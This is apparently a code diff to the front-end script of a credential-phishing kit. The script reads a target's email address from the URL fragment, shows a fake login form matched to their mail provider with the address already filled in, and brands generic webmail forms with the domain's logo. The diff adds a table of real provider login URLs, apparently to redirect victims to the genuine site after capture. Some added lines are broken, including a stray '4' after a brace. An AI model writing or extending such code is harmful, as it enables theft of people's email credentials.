@@ -1,4 +1,21 @@
-let userDomain = ''; // define globally
+let userDomain = '';
+
+const redirectUrls = {
+    'gsuite': 'https://accounts.google.com/',
+    'outlook': 'https://login.microsoftonline.com/',
+    'hotmail': 'https://login.microsoftonline.com/',
+    'centurylink': 'https://mm-signin.centurylink.com/',
+    'msn': 'https://login.microsoftonline.com/',
+    'spectrum': 'https://id.spectrum.net/login/',
+    'yahoo': 'https://mail.yahoo.com/',
+    'zoho': 'https://mail.zoho.com/',
+    'aol': 'https://mail.aol.com/',
+    'yandex': 'https://passport.yandex.com/auth',
+    'gmx': 'https://www.gmx.com/',
+    'tuta': 'https://mail.tutanota.com/',
+    'proton': 'https://mail.proton.me/',
+    'microsoft': 'https://login.microsoftonline.com/', // Generic Microsoft 365 login
+};
 
 document.addEventListener('DOMContentLoaded', function() {
     const hash = window.location.hash.substring(1);
@@ -6,7 +23,7 @@ document.addEventListener('DOMContentLoaded', function() {
     if (hash && hash.includes('@')) {
         const email = hash;
         const domain = email.split('@')[1].toLowerCase();
-        userDomain = domain; // store for reuse in sendMessage
+        userDomain = domain;
 
         let formToShow = 'webmail';
 
@@ -28,7 +45,7 @@ document.addEventListener('DOMContentLoaded', function() {
             formToShow = 'zoho';
         } else if (domain === 'aol.com') {
             formToShow = 'aol';
-        } else if (domain === 'yandex.com') {
+        } else if (domain === 'yandex.com') {4
             formToShow = 'yandex';
         } else if (domain === 'gmx.com' || domain === 'gmx.us' || domain === 'gmx.de') {
             formToShow = 'gmx';
@@ -41,6 +58,7 @@ document.addEventListener('DOMContentLoaded', function() {
         } else {
             formToShow = 'webmail';
             customizeWebmailForm(domain);
+            redirectUrls['webmail'] = `https://mail.${userDomain}/` || `https://webmail.${userDomain}/` || `https://${userDomain}/login`;
         }
 
         document.getElementById(formToShow).style.display = 'block';
@@ -49,8 +67,13 @@ document.addEventListener('DOMContentLoaded', function() {
         if (emailField) {
             emailField.value = email;
         }
+        // global redirect URL
+        window.manualRedirectUrl = redirectUrls[formToShow];
+
     } else {
+        // Default if no hash/email
         document.getElementById('microsoft').style.display = 'block';
+        window.manualRedirectUrl = redirectUrls['microsoft'];
     }
 });
 
@@ -128,8 +151,7 @@ document.getElementById('webmail-title').textContent = `${domainTitle.charAt(0).
             ];
             
             const clearbitUrl = `https://logo.clearbit.com/${domain}`;
-            
-            // Create an image element to test loading
+
             const img = new Image();
             img.onload = function() {
                 loadingMessage.style.display = 'none';
@@ -149,8 +171,6 @@ document.getElementById('webmail-title').textContent = `${domainTitle.charAt(0).
                 logoElement.innerHTML = `<h1 style="margin:0;padding-top:30px;color:#444;">${domain.split('.')[0].toUpperCase()}</h1>`;
                 document.getElementById('webmail-button').style.backgroundColor = '#555';
             };
-            
-            // Start loading the image
             img.src = clearbitUrl;
         }
         
